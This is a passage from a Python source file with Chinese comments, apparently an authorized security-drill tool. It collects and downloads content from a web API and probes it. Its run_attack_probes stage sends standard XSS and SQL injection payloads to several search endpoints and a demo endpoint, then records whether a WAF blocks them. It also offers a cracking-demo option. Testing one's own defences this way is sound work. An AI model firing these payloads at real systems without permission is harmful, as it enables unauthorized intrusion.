                        if ok:
                            if self.cfg.verbose_download_logs:
                                self._log("info", f"[成功] 下载插画 #{idx} 第{i}张", sub_detail)
                        else:
                            if self.cfg.verbose_download_logs:
                                self._log("warn", f"[拒绝] 下载插画 #{idx} 第{i}张", sub_detail)
                    if fail_count == 0:
                        result["ok"] += 1
                    else:
                        result["rejected"] += 1
                    if self.cfg.verbose_download_logs:
                        self._log("info", f"插画 #{idx} 完成：成功 {ok_count} / 失败 {fail_count}")
                else:
                    ok, path, msg = self._export_article_doc(row)
                    detail = {"kind": kind, "index": idx, "id": row.get("id"), "title": row.get("title"), "target": path, "result": msg}
                    result["details"].append(detail)
                    if ok:
                        result["ok"] += 1
                        if self.cfg.verbose_download_logs:
                            self._log("info", f"[成功] 导出文章Word #{idx} {row.get('title')}", detail)
                    else:
                        result["rejected"] += 1
                        if self.cfg.verbose_download_logs:
                            self._log("warn", f"[拒绝] 导出文章Word #{idx} {row.get('title')}", detail)

        result["chat_export"] = self._export_chat_texts()
        self._write_json(self.cfg.output_dir / "reports" / "download_results.json", result)
        self._log("info", f"下载阶段结束：成功 {result['ok']}，拒绝 {result['rejected']}")
        return result

    def run_attack_probes(self) -> Dict[str, Any]:
        self._log("info", "开始攻击探测阶段（XSS/SQLi）")
        # 说明：
        # - 该阶段用于验证 WAF 是否拦截/记录（不是“漏洞已成功利用”的最终证明）
        # - /security-demo/user 是靶场对照接口；/videos、/categories、/contents、/friends/search-users 更接近真实业务入口
        xss_payloads = ["<script>alert(1)</script>", "<svg/onload=alert(1)>", "\"><img src=x onerror=alert(1)>"]
        sqli_payloads = ["' OR 1=1 --", "1 OR 1=1 --", "1 UNION SELECT 1 --"]
        probes: List[Dict[str, Any]] = []

        # 真实业务查询入口（q 参数）
        for p in ["/videos", "/categories", "/contents", "/friends/search-users"]:
            probes.append({"name": "xss", "method": "GET", "path": p, "params": {"q": xss_payloads[0]}})
            probes.append({"name": "sqli", "method": "GET", "path": p, "params": {"q": sqli_payloads[0]}})

        # 靶场对照（id 参数）
        probes.append({"name": "xss", "method": "GET", "path": "/security-demo/user", "params": {"id": xss_payloads[1]}})
        probes.append({"name": "sqli", "method": "GET", "path": "/security-demo/user", "params": {"id": sqli_payloads[1]}})

        def classify(status: int, body: Any) -> str:
            if status == 403:
                return "blocked"
            if status == 401:
                return "auth_required"
            if status == 404:
                return "not_found"
            if status >= 500:
                return "server_error"
            return "passed"

        def reflected(payload: str, body: Any) -> bool:
            try:
                t = json.dumps(body, ensure_ascii=False)
            except Exception:
                t = str(body)
            return payload in t

        rows: List[Dict[str, Any]] = []
        for p in probes:
            try:
                status, body = self._request_with_params(p["method"], p["path"], p["params"])
                payload_val = next(iter(p["params"].values())) if isinstance(p.get("params"), dict) and p["params"] else ""
                verdict = classify(status, body)
                row = {
                    "type": p["name"],
                    "method": p["method"],
                    "path": p["path"],
                    "params": p["params"],
                    "status": status,
                    "hint": self._body_hint(body),
                    "verdict": verdict,
                    "reflected": bool(payload_val) and reflected(str(payload_val), body),
                }
                rows.append(row)
                # 终端保持极简：只展示关键结论
                level = "warn" if verdict in {"blocked", "server_error"} else "info"
                self._log(
                    level,
                    f"探测 {p['name']} {p['method']} {p['path']} -> {verdict} (HTTP {status})",
                    {"type": row["type"], "path": row["path"], "status": row["status"], "verdict": row["verdict"], "hint": row["hint"]},
                )
            except Exception as exc:
                row = {
                    "type": p["name"],
                    "method": p["method"],
                    "path": p["path"],
                    "params": p["params"],
                    "status": 0,
                    "hint": str(exc),
                    "verdict": "exception",
                    "reflected": False,
                }
                rows.append(row)
                self._log("warn", f"探测异常 {p['name']} {p['method']} {p['path']}", {"type": row["type"], "path": row["path"], "hint": row["hint"]})
            self._delay()
        self._write_json(self.cfg.output_dir / "reports" / "attack_probe_results.json", rows)
        return {"enabled": True, "total": len(rows), "items": rows}

    def verify_integrity(self) -> Dict[str, Any]:
        self._log("info", "执行完整性校验与去重摘要生成")
        all_json = list((self.cfg.output_dir / "collected").rglob("*.json"))
        downloaded_files = [p for p in (self.cfg.output_dir / "downloads").rglob("*") if p.is_file()]
        records = []
        for p in all_json:
            data = p.read_bytes()
            records.append(
                {
                    "file": str(p.relative_to(self.cfg.output_dir)),
                    "sha256": hashlib.sha256(data).hexdigest(),
                    "size": len(data),
                }
            )
        for p in downloaded_files:
            data = p.read_bytes()
            records.append(
                {
                    "file": str(p.relative_to(self.cfg.output_dir)),
                    "sha256": hashlib.sha256(data).hexdigest(),
                    "size": len(data),
                }
            )
        self._write_json(self.cfg.output_dir / "integrity" / "checksums.json", records)
        return {"files": len(records)}


def _parse_counts(raw: str) -> Dict[str, int]:
    out: Dict[str, int] = {}
    if not raw.strip():
        return out
    for part in raw.split(","):
        if "=" not in part:
            continue
        k, v = part.split("=", 1)
        k = k.strip()
        v = v.strip()
        if k in {"video", "image", "article"} and v.isdigit():
            out[k] = int(v)
    return out


def _parse_item_indexes(raw: str) -> Dict[str, List[int]]:
    out: Dict[str, List[int]] = {}
    if not raw.strip():
        return out
    for seg in raw.split(";"):
        if ":" not in seg:
            continue
        kind, indexes = seg.split(":", 1)
        kind = kind.strip()
        if kind not in {"video", "image", "article"}:
            continue
        vals: List[int] = []
        for x in indexes.split(","):
            x = x.strip()
            if x.isdigit():
                vals.append(int(x))
        if vals:
            out[kind] = vals
    return out


def build_arg_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="授权安全演练：Web资源探测与结构化采集工具（Python）")
    p.add_argument("--base-url", default="http://localhost:3000/api", help="目标 API 基础地址")
    p.add_argument("--asset-origin", default="", help="资源下载域名/端口覆盖（例如 http://localhost:5173）")
    p.add_argument("--output-dir", default="tools/authorized_security_tester/output", help="输出目录")
    p.add_argument("--mode", choices=["manual", "auto", "hybrid"], default="auto", help="运行模式")
    p.add_argument("--timeout", type=int, default=15, help="HTTP 超时（秒）")
    p.add_argument("--delay-ms", type=int, default=200, help="步进请求间隔（毫秒）")
    p.add_argument("--max-pages", type=int, default=3, help="预留参数：分页采集最大页数")
    p.add_argument("--max-items-per-type", type=int, default=120, help="单类最多保存条数")
    p.add_argument("--probe-ws-url", default="", help="可选：WebSocket 地址（ws:// 或 wss://）")
    p.add_argument("--include-crack-demo", action="store_true", help="是否调用 /leak/crack 进行破解演示")
    p.add_argument(
        "--enable-attack-probes",
        action="store_true",
        default=True,
        help="启用XSS/SQLi探测阶段（默认开启，仅授权演练）",
    )
    p.add_argument("--disable-attack-probes", action="store_true", help="关闭XSS/SQLi探测阶段")
    p.add_argument("--show-asset-inventory", action="store_true", help="在终端打印完整资产清单（默认关闭）")
    p.add_argument("--verbose-download-logs", action="store_true", help="打印每个下载动作日志（默认仅输出下载总结）")
    p.add_argument("--print-summary-json", action="store_true", help="终端打印最终summary JSON（默认仅写入文件）")
    p.add_argument(
        "--download-policy",
        choices=["prompt", "all", "type", "item", "none"],
        default="prompt",
        help="下载策略：prompt 交互选择，all 全部，type 按类型，item 按序号，none 不下载",
    )
    p.add_argument("--download-types", default="video,image,article", help="download-policy=type 时使用，逗号分隔")
    p.add_argument("--download-counts", default="", help="按类型下载数量，如 video=2,image=5,article=1")
    p.add_argument("--download-item-indexes", default="", help="按条目下载，如 video:1,3;image:2;article:1")
    return p


def main() -> int:
    args = build_arg_parser().parse_args()
    cfg = CollectorConfig(
        base_url=args.base_url,
        output_dir=Path(args.output_dir),
        timeout=args.timeout,
        delay_ms=args.delay_ms,
        max_pages=args.max_pages,
        max_items_per_type=args.max_items_per_type,
        mode=args.mode,
        probe_ws_url=args.probe_ws_url.strip() or None,
        include_crack_demo=bool(args.include_crack_demo),
        asset_origin=args.asset_origin.strip(),
        enable_attack_probes=bool(args.enable_attack_probes) and not bool(args.disable_attack_probes),
        show_asset_inventory=bool(args.show_asset_inventory),
        verbose_download_logs=bool(args.verbose_download_logs),
        print_summary_json=bool(args.print_summary_json),
        download_policy=args.download_policy,
        download_types=[x.strip() for x in args.download_types.split(",") if x.strip() in {"video", "image", "article"}],
        download_counts=_parse_counts(args.download_counts),
        download_item_indexes=_parse_item_indexes(args.download_item_indexes),
    )
    collector = StructuredCollector(cfg)
    try:
        summary = collector.run()
        if cfg.print_summary_json:
            print(json.dumps(summary, ensure_ascii=False, indent=2))
        return 0
    except KeyboardInterrupt:
        print("任务被中断")
        return 130
    except Exception as exc:
        print(f"执行失败: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
